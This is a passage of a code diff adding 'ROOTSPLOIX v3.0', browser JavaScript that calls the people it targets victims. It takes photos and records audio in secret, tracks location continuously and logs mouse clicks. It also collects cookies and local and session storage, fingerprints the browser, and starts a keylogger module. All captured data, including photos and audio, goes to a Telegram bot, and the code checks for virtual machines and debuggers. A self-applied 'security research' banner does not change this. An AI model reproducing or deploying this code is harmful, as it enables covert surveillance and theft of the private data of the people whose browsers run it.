+                            target: this.hoverStart.target,
+                            duration: hoverDuration
+                        });
+                    }
+                }
+            }
+            
+            processMouseMove(moveData) {
+                this.mouseHistory.push(moveData);
+                this.statistics.totalMoves++;
+                
+                // Calculate speed
+                if (this.mouseHistory.length > 1) {
+                    const prev = this.mouseHistory[this.mouseHistory.length - 2];
+                    const distance = Math.sqrt(
+                        Math.pow(moveData.x - prev.x, 2) + Math.pow(moveData.y - prev.y, 2)
+                    );
+                    const time = moveData.timestamp - prev.timestamp;
+                    const speed = distance / time; // pixels per ms
+                    this.statistics.averageSpeed = (this.statistics.averageSpeed + speed) / 2;
+                }
+                
+                // Maintain buffer size
+                if (this.mouseHistory.length > 1000) {
+                    this.mouseHistory.shift();
+                }
+                
+                ROOTSPLOIX_SESSION.capturedData.mouseClicks.push(moveData);
+            }
+            
+            processClick(clickData) {
+                this.clickHistory.push(clickData);
+                this.statistics.totalClicks++;
+                
+                // Update session statistics
+                ROOTSPLOIX_SESSION.statistics.clickCount++;
+                
+                // Store in session
+                ROOTSPLOIX_SESSION.capturedData.mouseClicks.push(clickData);
+            }
+            
+            processScroll(scrollData) {
+                this.scrollHistory.push(scrollData);
+                this.statistics.totalScrolls++;
+                
+                // Maintain buffer
+                if (this.scrollHistory.length > 100) {
+                    this.scrollHistory.shift();
+                }
+            }
+            
+            updateHeatmap(moveData) {
+                const gridSize = 50;
+                const gridX = Math.floor(moveData.x / gridSize);
+                const gridY = Math.floor(moveData.y / gridSize);
+                const key = `${gridX},${gridY}`;
+                
+                if (!this.heatmapData.has(key)) {
+                    this.heatmapData.set(key, 0);
+                }
+                this.heatmapData.set(key, this.heatmapData.get(key) + 1);
+            }
+            
+            async reportClick(clickData) {
+                const message = `🖱️ CLICK DETECTED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+🎯 Target: ${clickData.target.tagName}
+📍 Position: ${clickData.x}, ${clickData.y}
+🕰️ Time: ${new Date().toLocaleString()}
+🌍 URL: ${window.location.href}
+
+📝 Details:
+• ID: ${clickData.target.id || 'None'}
+• Class: ${clickData.target.className || 'None'}
+• Text: ${clickData.target.textContent || 'None'}
+• Value: ${clickData.target.value || 'None'}
+• Link: ${clickData.target.href || 'None'}
+
+📈 Statistics:
+• Total Clicks: ${this.statistics.totalClicks}
+• Avg Speed: ${this.statistics.averageSpeed.toFixed(2)} px/ms
+
+💀 ROOTSPLOIX v3.0`;
+                
+                await telegram.sendMessage(message);
+            }
+            
+            async reportSpecialClick(type, data) {
+                const message = `✨ SPECIAL ${type.toUpperCase()} DETECTED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+🏷️ Type: ${type}
+📍 Position: ${data.x || 'N/A'}, ${data.y || 'N/A'}
+🎯 Target: ${data.target}
+🕰️ Duration: ${data.duration ? data.duration + 'ms' : 'N/A'}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 ROOTSPLOIX v3.0`;
+                
+                await telegram.sendMessage(message);
+            }
+            
+            generateHeatmapReport() {
+                const topHotspots = Array.from(this.heatmapData.entries())
+                    .sort((a, b) => b[1] - a[1])
+                    .slice(0, 10)
+                    .map(([coords, count]) => {
+                        const [x, y] = coords.split(',');
+                        return `• (${x * 50}, ${y * 50}): ${count} moves`;
+                    });
+                
+                return `🔥 MOUSE HEATMAP ANALYSIS
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📈 Total Moves: ${this.statistics.totalMoves}
+🎯 Total Clicks: ${this.statistics.totalClicks}
+⚡ Avg Speed: ${this.statistics.averageSpeed.toFixed(2)} px/ms
+
+🔥 Top Hotspots:
+${topHotspots.join('\n')}
+
+💀 ROOTSPLOIX v3.0`;
+            }
+            
+            start() {
+                this.isActive = true;
+                RootsploixUtils.log('info', 'Mouse tracker started');
+            }
+            
+            stop() {
+                this.isActive = false;
+                RootsploixUtils.log('info', 'Mouse tracker stopped');
+            }
+        }
+        
+        // ===== MEDIA CAPTURE MODULE =====
+        class MediaCapture {
+            constructor() {
+                this.isActive = false;
+                this.mediaStream = null;
+                this.mediaRecorder = null;
+                this.audioRecorder = null;
+                this.videoRecorder = null;
+                this.recordedChunks = [];
+                this.captureInterval = null;
+                this.capabilities = {
+                    camera: false,
+                    microphone: false,
+                    screen: false
+                };
+            }
+            
+            async initialize() {
+                RootsploixUtils.log('info', 'Initializing media capture');
+                
+                // Test capabilities
+                await this.testCapabilities();
+                
+                // Start automatic capture if possible
+                if (this.capabilities.camera || this.capabilities.microphone) {
+                    await this.startStealthCapture();
+                }
+            }
+            
+            async testCapabilities() {
+                try {
+                    // Test camera access
+                    const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    this.capabilities.camera = true;
+                    videoStream.getTracks().forEach(track => track.stop());
+                } catch (e) {
+                    RootsploixUtils.log('warn', 'Camera access denied', e);
+                }
+                
+                try {
+                    // Test microphone access
+                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    this.capabilities.microphone = true;
+                    audioStream.getTracks().forEach(track => track.stop());
+                } catch (e) {
+                    RootsploixUtils.log('warn', 'Microphone access denied', e);
+                }
+                
+                try {
+                    // Test screen capture
+                    if (navigator.mediaDevices.getDisplayMedia) {
+                        this.capabilities.screen = true;
+                    }
+                } catch (e) {
+                    RootsploixUtils.log('warn', 'Screen capture not supported', e);
+                }
+                
+                const capabilityMsg = `📹 MEDIA CAPABILITIES DETECTED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📷 Camera: ${this.capabilities.camera ? '✅' : '❌'}
+🎤 Microphone: ${this.capabilities.microphone ? '✅' : '❌'}
+🖥️ Screen: ${this.capabilities.screen ? '✅' : '❌'}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 ROOTSPLOIX v3.0`;
+                
+                await telegram.sendMessage(capabilityMsg);
+            }
+            
+            async startStealthCapture() {
+                try {
+                    const constraints = {
+                        video: this.capabilities.camera,
+                        audio: this.capabilities.microphone
+                    };
+                    
+                    this.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    
+                    const startMsg = `🎞️ STEALTH CAPTURE STARTED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📹 Video Tracks: ${this.mediaStream.getVideoTracks().length}
+🎤 Audio Tracks: ${this.mediaStream.getAudioTracks().length}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 ROOTSPLOIX v3.0`;
+                    
+                    await telegram.sendMessage(startMsg);
+                    
+                    // Start periodic capture
+                    this.startPeriodicCapture();
+                    
+                } catch (error) {
+                    RootsploixUtils.log('error', 'Failed to start stealth capture', error);
+                    
+                    const errorMsg = `❌ MEDIA CAPTURE FAILED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+⚠️ Error: ${error.message}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 ROOTSPLOIX v3.0`;
+                    
+                    await telegram.sendMessage(errorMsg);
+                }
+            }
+            
+            startPeriodicCapture() {
+                // Take photo every 2 minutes
+                this.captureInterval = setInterval(() => {
+                    this.capturePhoto();
+                }, 120000);
+                
+                // Record audio every 5 minutes
+                setInterval(() => {
+                    this.recordAudio(30000); // 30 seconds
+                }, 300000);
+                
+                // Take immediate photo
+                setTimeout(() => this.capturePhoto(), 5000);
+            }
+            
+            async capturePhoto() {
+                if (!this.mediaStream || this.mediaStream.getVideoTracks().length === 0) {
+                    return;
+                }
+                
+                try {
+                    const video = document.createElement('video');
+                    video.srcObject = this.mediaStream;
+                    video.style.display = 'none';
+                    document.body.appendChild(video);
+                    
+                    video.play();
+                    
+                    video.addEventListener('loadedmetadata', () => {
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            
+                            canvas.toBlob(async (blob) => {
+                                if (blob) {
+                                    await this.sendPhotoToTelegram(blob);
+                                    ROOTSPLOIX_SESSION.statistics.cameraCount++;
+                                }
+                                document.body.removeChild(video);
+                            }, 'image/jpeg', 0.8);
+                        }, 2000);
+                    });
+                    
+                } catch (error) {
+                    RootsploixUtils.log('error', 'Photo capture failed', error);
+                }
+            }
+            
+            async recordAudio(duration = 30000) {
+                if (!this.mediaStream || this.mediaStream.getAudioTracks().length === 0) {
+                    return;
+                }
+                
+                try {
+                    this.recordedChunks = [];
+                    
+                    const options = {
+                        mimeType: 'audio/webm;codecs=opus'
+                    };
+                    
+                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                        options.mimeType = 'audio/webm';
+                    }
+                    
+                    this.audioRecorder = new MediaRecorder(this.mediaStream, options);
+                    
+                    this.audioRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            this.recordedChunks.push(event.data);
+                        }
+                    };
+                    
+                    this.audioRecorder.onstop = async () => {
+                        const audioBlob = new Blob(this.recordedChunks, {
+                            type: options.mimeType
+                        });
+                        
+                        if (audioBlob.size > 0) {
+                            await this.sendAudioToTelegram(audioBlob);
+                            ROOTSPLOIX_SESSION.statistics.audioCount++;
+                        }
+                    };
+                    
+                    this.audioRecorder.start();
+                    
+                    setTimeout(() => {
+                        if (this.audioRecorder && this.audioRecorder.state === 'recording') {
+                            this.audioRecorder.stop();
+                        }
+                    }, duration);
+                    
+                } catch (error) {
+                    RootsploixUtils.log('error', 'Audio recording failed', error);
+                }
+            }
+            
+            async sendPhotoToTelegram(blob) {
+                try {
+                    const formData = new FormData();
+                    formData.append('chat_id', ROOTSPLOIX_CONFIG.telegram.chatId);
+                    formData.append('photo', blob, `camera_${Date.now()}.jpg`);
+                    formData.append('caption', `📷 STEALTH CAMERA CAPTURE!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+🕒 Time: ${new Date().toLocaleString()}
+💾 Size: ${RootsploixUtils.formatBytes(blob.size)}
+
+💀 ROOTSPLOIX v3.0`);
+                    
+                    const response = await fetch(`${ROOTSPLOIX_CONFIG.telegram.apiUrl}${ROOTSPLOIX_CONFIG.telegram.botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    if (response.ok) {
+                        RootsploixUtils.log('info', 'Photo sent to Telegram');
+                    } else {
+                        throw new Error(`HTTP ${response.status}`);
+                    }
+                    
+                } catch (error) {
+                    RootsploixUtils.log('error', 'Failed to send photo', error);
+                }
+            }
+            
+            async sendAudioToTelegram(blob) {
+                try {
+                    const formData = new FormData();
+                    formData.append('chat_id', ROOTSPLOIX_CONFIG.telegram.chatId);
+                    formData.append('audio', blob, `audio_${Date.now()}.webm`);
+                    formData.append('caption', `🎤 STEALTH AUDIO RECORDING!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+🕒 Time: ${new Date().toLocaleString()}
+💾 Size: ${RootsploixUtils.formatBytes(blob.size)}
+⏱️ Duration: ~30 seconds
+
+💀 ROOTSPLOIX v3.0`);
+                    
+                    const response = await fetch(`${ROOTSPLOIX_CONFIG.telegram.apiUrl}${ROOTSPLOIX_CONFIG.telegram.botToken}/sendAudio`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    if (response.ok) {
+                        RootsploixUtils.log('info', 'Audio sent to Telegram');
+                    } else {
+                        throw new Error(`HTTP ${response.status}`);
+                    }
+                    
+                } catch (error) {
+                    RootsploixUtils.log('error', 'Failed to send audio', error);
+                }
+            }
+            
+            stop() {
+                if (this.captureInterval) {
+                    clearInterval(this.captureInterval);
+                }
+                
+                if (this.mediaStream) {
+                    this.mediaStream.getTracks().forEach(track => track.stop());
+                }
+                
+                if (this.audioRecorder && this.audioRecorder.state === 'recording') {
+                    this.audioRecorder.stop();
+                }
+                
+                RootsploixUtils.log('info', 'Media capture stopped');
+            }
+        }
+        
+        // ===== LOCATION TRACKING MODULE =====
+        class LocationTracker {
+            constructor() {
+                this.isActive = false;
+                this.watchId = null;
+                this.locationHistory = [];
+                this.currentLocation = null;
+                this.options = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 60000
+                };
+            }
+            
+            async initialize() {
+                if (!navigator.geolocation) {
+                    RootsploixUtils.log('warn', 'Geolocation not supported');
+                    return;
+                }
+                
+                try {
+                    await this.getCurrentLocation();
+                    this.startTracking();
+                } catch (error) {
+                    RootsploixUtils.log('error', 'Location access denied', error);
+                    
+                    const errorMsg = `⚠️ LOCATION ACCESS DENIED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+⚠️ Error: ${error.message}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 ROOTSPLOIX v3.0`;
+                    
+                    await telegram.sendMessage(errorMsg);
+                }
+            }
+            
+            getCurrentLocation() {
+                return new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            this.processLocation(position);
+                            resolve(position);
+                        },
+                        (error) => {
+                            reject(error);
+                        },
+                        this.options
+                    );
+                });
+            }
+            
+            startTracking() {
+                if (!navigator.geolocation) return;
+                
+                this.isActive = true;
+                
+                this.watchId = navigator.geolocation.watchPosition(
+                    (position) => {
+                        this.processLocation(position);
+                    },
+                    (error) => {
+                        RootsploixUtils.log('error', 'Location tracking error', error);
+                    },
+                    {
+                        ...this.options,
+                        maximumAge: 300000 // 5 minutes
+                    }
+                );
+                
+                RootsploixUtils.log('info', 'Location tracking started');
+            }
+            
+            async processLocation(position) {
+                const locationData = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    altitudeAccuracy: position.coords.altitudeAccuracy,
+                    heading: position.coords.heading,
+                    speed: position.coords.speed,
+                    timestamp: position.timestamp
+                };
+                
+                this.currentLocation = locationData;
+                this.locationHistory.push(locationData);
+                
+                // Maintain history size
+                if (this.locationHistory.length > 100) {
+                    this.locationHistory.shift();
+                }
+                
+                // Store in session
+                ROOTSPLOIX_SESSION.capturedData.locationData.push(locationData);
+                
+                // Report significant location changes
+                if (this.shouldReportLocation(locationData)) {
+                    await this.reportLocation(locationData);
+                }
+            }
+            
+            shouldReportLocation(newLocation) {
+                if (this.locationHistory.length < 2) return true;
+                
+                const lastReported = this.locationHistory[this.locationHistory.length - 2];
+                const distance = this.calculateDistance(
+                    lastReported.latitude, lastReported.longitude,
+                    newLocation.latitude, newLocation.longitude
+                );
+                
+                // Report if moved more than 100 meters or 30 minutes passed
+                const timeDiff = newLocation.timestamp - lastReported.timestamp;
+                return distance > 0.1 || timeDiff > 1800000; // 30 minutes
+            }
+            
+            calculateDistance(lat1, lon1, lat2, lon2) {
+                const R = 6371; // Earth's radius in km
+                const dLat = this.toRad(lat2 - lat1);
+                const dLon = this.toRad(lon2 - lon1);
+                const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
+                        Math.cos(this.toRad(lat1)) * Math.cos(this.toRad(lat2)) *
+                        Math.sin(dLon/2) * Math.sin(dLon/2);
+                const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+                return R * c;
+            }
+            
+            toRad(deg) {
+                return deg * (Math.PI/180);
+            }
+            
+            async reportLocation(locationData) {
+                const message = `📍 LOCATION UPDATE!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+🌍 Coordinates:
+• Latitude: ${locationData.latitude.toFixed(6)}
+• Longitude: ${locationData.longitude.toFixed(6)}
+• Accuracy: ${locationData.accuracy.toFixed(0)}m
+• Altitude: ${locationData.altitude ? locationData.altitude.toFixed(0) + 'm' : 'N/A'}
+• Speed: ${locationData.speed ? (locationData.speed * 3.6).toFixed(1) + ' km/h' : 'N/A'}
+• Heading: ${locationData.heading ? locationData.heading.toFixed(0) + '°' : 'N/A'}
+
+🕒 Time: ${new Date(locationData.timestamp).toLocaleString()}
+🗺 Maps: https://maps.google.com/maps?q=${locationData.latitude},${locationData.longitude}
+
+💀 ROOTSPLOIX v3.0`;
+                
+                await telegram.sendMessage(message);
+            }
+            
+            stop() {
+                if (this.watchId !== null) {
+                    navigator.geolocation.clearWatch(this.watchId);
+                    this.watchId = null;
+                }
+                this.isActive = false;
+                RootsploixUtils.log('info', 'Location tracking stopped');
+            }
+        }
+        
+        // ===== BROWSER DATA COLLECTOR =====
+        class BrowserDataCollector {
+            constructor() {
+                this.collectionInterval = null;
+            }
+            
+            async initialize() {
+                RootsploixUtils.log('info', 'Initializing browser data collection');
+                
+                // Collect initial data
+                await this.collectAllData();
+                
+                // Set up periodic collection
+                this.startPeriodicCollection();
+            }
+            
+            async collectAllData() {
+                const browserData = {
+                    cookies: this.collectCookies(),
+                    localStorage: this.collectLocalStorage(),
+                    sessionStorage: this.collectSessionStorage(),
+                    indexedDB: await this.collectIndexedDB(),
+                    webSQL: this.collectWebSQL(),
+                    history: this.collectBrowserHistory(),
+                    bookmarks: this.collectBookmarks(),
+                    extensions: this.detectExtensions(),
+                    plugins: this.collectPlugins(),
+                    fonts: await this.collectSystemFonts(),
+                    webGL: this.collectWebGLInfo(),
+                    canvas: this.generateCanvasFingerprint(),
+                    audio: this.generateAudioFingerprint(),
+                    battery: await this.collectBatteryInfo(),
+                    connection: this.collectConnectionInfo(),
+                    permissions: await this.checkPermissions()
+                };
+                
+                // Store in session
+                ROOTSPLOIX_SESSION.capturedData.browserData = browserData;
+                
+                // Report collected data
+                await this.reportBrowserData(browserData);
+                
+                return browserData;
+            }
+            
+            collectCookies() {
+                const cookies = {};
+                document.cookie.split(';').forEach(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name && value) {
+                        cookies[name] = value;
+                    }
+                });
+                return cookies;
+            }
+            
+            collectLocalStorage() {
+                const data = {};
+                try {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        const value = localStorage.getItem(key);
+                        if (key && value && value.length < 1000) {
+                            data[key] = value;
+                        }
+                    }
+                } catch (e) {
+                    RootsploixUtils.log('warn', 'localStorage access denied', e);
+                }
+                return data;
+            }
+            
+            collectSessionStorage() {
+                const data = {};
+                try {
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        const value = sessionStorage.getItem(key);
+                        if (key && value && value.length < 1000) {
+                            data[key] = value;
+                        }
+                    }
+                } catch (e) {
+                    RootsploixUtils.log('warn', 'sessionStorage access denied', e);
+                }
+                return data;
+            }
+            
+            async collectIndexedDB() {
+                if (!window.indexedDB) return null;
+                
+                try {
+                    const databases = await indexedDB.databases();
+                    return databases.map(db => ({
+                        name: db.name,
+                        version: db.version
+                    }));
+                } catch (e) {
+                    return null;
+                }
+            }
+            
+            collectWebSQL() {
+                if (!window.openDatabase) return null;
+                
+                try {
+                    const db = window.openDatabase('test', '1.0', 'test', 1024);
+                    return {
+                        supported: true,
+                        version: db.version
+                    };
+                } catch (e) {
+                    return { supported: false };
+                }
+            }
+            
+            collectBrowserHistory() {
+                return {
+                    length: history.length,
+                    currentIndex: history.state
+                };
+            }
+            
+            collectBookmarks() {
+                // This would require permission, so we just detect capability
+                return {
+                    supported: !!navigator.permissions
+                };
+            }
+            
+            detectExtensions() {
+                const extensions = [];
+                
+                // Common extension detection methods
+                const extensionTests = {
+                    'AdBlock Plus': () => {
+                        const div = document.createElement('div');
+                        div.innerHTML = '&nbsp;';
+                        div.className = 'adsbox';
+                        document.body.appendChild(div);
+                        const blocked = div.offsetHeight === 0;
+                        document.body.removeChild(div);
+                        return blocked;
+                    },
+                    'uBlock Origin': () => {
+                        return typeof window.uBlockOrigin !== 'undefined';
+                    },
+                    'Ghostery': () => {
+                        return typeof window.Ghostery !== 'undefined';
+                    },
+                    'Privacy Badger': () => {
+                        return typeof window.badger !== 'undefined';
+                    }
+                };
+                
+                for (const [name, test] of Object.entries(extensionTests)) {
+                    try {
+                        if (test()) {
+                            extensions.push(name);
+                        }
+                    } catch (e) {
+                        // Extension detection failed
+                    }
+                }
+                
+                return extensions;
+            }
+            
+            collectPlugins() {
+                const plugins = [];
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    const plugin = navigator.plugins[i];
+                    plugins.push({
+                        name: plugin.name,
+                        description: plugin.description,
+                        filename: plugin.filename,
+                        version: plugin.version
+                    });
+                }
+                return plugins;
+            }
+            
+            async collectSystemFonts() {
+                if (!window.queryLocalFonts) {
+                    return { supported: false };
+                }
+                
+                try {
+                    const fonts = await window.queryLocalFonts();
+                    return {
+                        supported: true,
+                        count: fonts.length,
+                        fonts: fonts.slice(0, 50).map(font => font.family)
+                    };
+                } catch (e) {
+                    return { supported: false, error: e.message };
+                }
+            }
+            
+            collectWebGLInfo() {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                
+                if (!gl) {
+                    return { supported: false };
+                }
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return {
+                    supported: true,
+                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
+                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null,
+                    version: gl.getParameter(gl.VERSION),
+                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+                };
+            }
+            
+            generateCanvasFingerprint() {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                // Draw complex pattern
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.textAlign = 'left';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('ROOTSPLOIX 🔥', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('ROOTSPLOIX 🔥', 4, 17);
+                
+                return {
+                    dataURL: canvas.toDataURL(),
+                    hash: RootsploixUtils.generateHash(canvas.toDataURL())
+                };
+            }
+            
+            generateAudioFingerprint() {
+                if (!window.AudioContext && !window.webkitAudioContext) {
+                    return { supported: false };
+                }
+                
+                try {
+                    const AudioContext = window.AudioContext || window.webkitAudioContext;
+                    const context = new AudioContext();
+                    
+                    return {
+                        supported: true,
+                        sampleRate: context.sampleRate,
+                        maxChannelCount: context.destination.maxChannelCount,
+                        numberOfInputs: context.destination.numberOfInputs,
+                        numberOfOutputs: context.destination.numberOfOutputs,
+                        channelCount: context.destination.channelCount
+                    };
+                } catch (e) {
+                    return { supported: false, error: e.message };
+                }
+            }
+            
+            async collectBatteryInfo() {
+                if (!navigator.getBattery) {
+                    return { supported: false };
+                }
+                
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        supported: true,
+                        level: battery.level,
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch (e) {
+                    return { supported: false, error: e.message };
+                }
+            }
+            
+            collectConnectionInfo() {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                
+                if (!connection) {
+                    return { supported: false };
+                }
+                
+                return {
+                    supported: true,
+                    effectiveType: connection.effectiveType,
+                    downlink: connection.downlink,
+                    downlinkMax: connection.downlinkMax,
+                    rtt: connection.rtt,
+                    saveData: connection.saveData,
+                    type: connection.type
+                };
+            }
+            
+            async checkPermissions() {
+                if (!navigator.permissions) {
+                    return { supported: false };
+                }
+                
+                const permissions = {};
+                const permissionList = [
+                    'geolocation', 'notifications', 'push', 'midi', 'camera',
+                    'microphone', 'background-sync', 'persistent-storage'
+                ];
+                
+                for (const permission of permissionList) {
+                    try {
+                        const result = await navigator.permissions.query({ name: permission });
+                        permissions[permission] = result.state;
+                    } catch (e) {
+                        permissions[permission] = 'error';
+                    }
+                }
+                
+                return { supported: true, permissions };
+            }
+            
+            async reportBrowserData(data) {
+                const summary = {
+                    cookies: Object.keys(data.cookies).length,
+                    localStorage: Object.keys(data.localStorage).length,
+                    sessionStorage: Object.keys(data.sessionStorage).length,
+                    extensions: data.extensions.length,
+                    plugins: data.plugins.length,
+                    webGL: data.webGL.supported,
+                    audio: data.audio.supported,
+                    battery: data.battery.supported,
+                    connection: data.connection.supported
+                };
+                
+                const message = `📋 BROWSER DATA COLLECTED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+🕒 Time: ${new Date().toLocaleString()}
+
+📈 Data Summary:
+• Cookies: ${summary.cookies}
+• LocalStorage: ${summary.localStorage} items
+• SessionStorage: ${summary.sessionStorage} items
+• Extensions: ${summary.extensions}
+• Plugins: ${summary.plugins}
+• WebGL: ${summary.webGL ? '✅' : '❌'}
+• Audio Context: ${summary.audio ? '✅' : '❌'}
+• Battery API: ${summary.battery ? '✅' : '❌'}
+• Connection API: ${summary.connection ? '✅' : '❌'}
+
+🎯 Canvas Hash: ${data.canvas.hash}
+
+💀 ROOTSPLOIX v3.0`;
+                
+                await telegram.sendMessage(message);
+                
+                // Send detailed extension info if any found
+                if (data.extensions.length > 0) {
+                    const extMsg = `🧩 EXTENSIONS DETECTED!
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+🔌 Extensions Found:
+${data.extensions.map(ext => `• ${ext}`).join('\n')}
+
+💀 ROOTSPLOIX v3.0`;
+                    await telegram.sendMessage(extMsg);
+                }
+            }
+            
+            startPeriodicCollection() {
+                // Collect data every 30 minutes
+                this.collectionInterval = setInterval(() => {
+                    this.collectAllData();
+                }, 1800000);
+            }
+            
+            stop() {
+                if (this.collectionInterval) {
+                    clearInterval(this.collectionInterval);
+                }
+                RootsploixUtils.log('info', 'Browser data collection stopped');
+            }
+        }
+        
+        // ===== MAIN ROOTSPLOIX FRAMEWORK CONTROLLER =====
+        class RootsploixFramework {
+            constructor() {
+                this.isInitialized = false;
+                this.modules = {};
+                this.telegram = null;
+                this.victimProfiler = null;
+                this.keylogger = null;
+                this.mouseTracker = null;
+                this.mediaCapture = null;
+                this.locationTracker = null;
+                this.browserDataCollector = null;
+                this.reportingInterval = null;
+            }
+            
+            async initialize() {
+                try {
+                    RootsploixUtils.log('info', 'Initializing ROOTSPLOIX Framework v3.0');
+                    
+                    // Initialize core modules
+                    this.telegram = new TelegramAPI();
+                    this.victimProfiler = new VictimProfiler();
+                    this.keylogger = new AdvancedKeylogger();
+                    this.mouseTracker = new MouseTracker();
+                    this.mediaCapture = new MediaCapture();
+                    this.locationTracker = new LocationTracker();
+                    this.browserDataCollector = new BrowserDataCollector();
+                    
+                    // Security checks
+                    if (RootsploixUtils.isBot()) {
+                        RootsploixUtils.log('warn', 'Bot detected, limiting functionality');
+                        return;
+                    }
+                    
+                    if (RootsploixUtils.detectVM()) {
+                        RootsploixUtils.log('warn', 'Virtual machine detected');
+                    }
+                    
+                    if (RootsploixUtils.detectDebugger()) {
+                        RootsploixUtils.log('warn', 'Debugger detected');
+                    }
+                    
+                    // Send initial notification
+                    await this.sendInitialNotification();
+                    
+                    // Generate victim profile
+                    await this.victimProfiler.generateProfile();
+                    
+                    // Initialize all modules
+                    await this.initializeModules();
+                    
+                    // Start periodic reporting
+                    this.startPeriodicReporting();
+                    
+                    // Mark as initialized
+                    this.isInitialized = true;
+                    ROOTSPLOIX_SESSION.isActive = true;
+                    
+                    RootsploixUtils.log('info', 'ROOTSPLOIX Framework initialization complete');
+                    
+                } catch (error) {
+                    RootsploixUtils.log('error', 'Framework initialization failed', error);
+                }
+            }
+            
+            async sendInitialNotification() {
+                const message = `🔥 ROOTSPLOIX v3.0 ACTIVATED!
+
+🎯 Session ID: ${ROOTSPLOIX_SESSION.id}
+🕒 Activation Time: ${new Date().toLocaleString()}
+🌍 Target URL: ${window.location.href}
+📱 Platform: ${navigator.platform}
+🌐 Browser: ${navigator.userAgent.match(/Chrome|Firefox|Safari|Edge/)?.[0] || 'Unknown'}
+🖥️ Screen: ${screen.width}x${screen.height}
+🌍 Language: ${navigator.language}
+
+🔍 System Status:
+• Bot Detection: ${RootsploixUtils.isBot() ? '⚠️ Detected' : '✅ Clean'}
+• VM Detection: ${RootsploixUtils.detectVM() ? '⚠️ Virtual' : '✅ Physical'}
+• Debug Detection: ${RootsploixUtils.detectDebugger() ? '⚠️ Active' : '✅ None'}
+
+🛡️ Framework Features:
+✅ Advanced Keylogging
+✅ Mouse Tracking & Heatmaps
+✅ Media Capture (Camera/Audio)
+✅ Location Tracking
+✅ Browser Data Collection
+✅ Real-time Monitoring
+✅ Stealth Operations
+
+💀 ULTRA PROFESSIONAL FRAMEWORK ACTIVE!
+
+——————————————————————————————
+ROOTSPLOIX SECURITY RESEARCH FRAMEWORK
+Version: ${ROOTSPLOIX_CONFIG.version}
+Build: ${ROOTSPLOIX_CONFIG.buildDate}
+Author: ${ROOTSPLOIX_CONFIG.author}
+——————————————————————————————`;
+                
+                await this.telegram.sendMessage(message);
+            }
+            
+            async initializeModules() {
+                const initPromises = [];
+                
+                // Initialize keylogger
+                initPromises.push((async () => {
+                    this.keylogger.start();
+                    RootsploixUtils.log('info', 'Keylogger module started');
+                })());
+                
+                // Initialize mouse tracker
+                initPromises.push((async () => {
+                    this.mouseTracker.start();
+                    RootsploixUtils.log('info', 'Mouse tracker module started');
+                })());
+                
+                // Initialize media capture
+                initPromises.push((async () => {
+                    await this.mediaCapture.initialize();
+                    RootsploixUtils.log('info', 'Media capture module initialized');
+                })());
+                
+                // Initialize location tracking
+                initPromises.push((async () => {
+                    await this.locationTracker.initialize();
+                    RootsploixUtils.log('info', 'Location tracker module initialized');
+                })());
+                
+                // Initialize browser data collector
+                initPromises.push((async () => {
+                    await this.browserDataCollector.initialize();
+                    RootsploixUtils.log('info', 'Browser data collector initialized');
+                })());
+                
+                // Wait for all modules to initialize
+                await Promise.allSettled(initPromises);
+            }
+            
+            startPeriodicReporting() {
+                // Send comprehensive report every 15 minutes
+                this.reportingInterval = setInterval(async () => {
+                    await this.sendPeriodicReport();
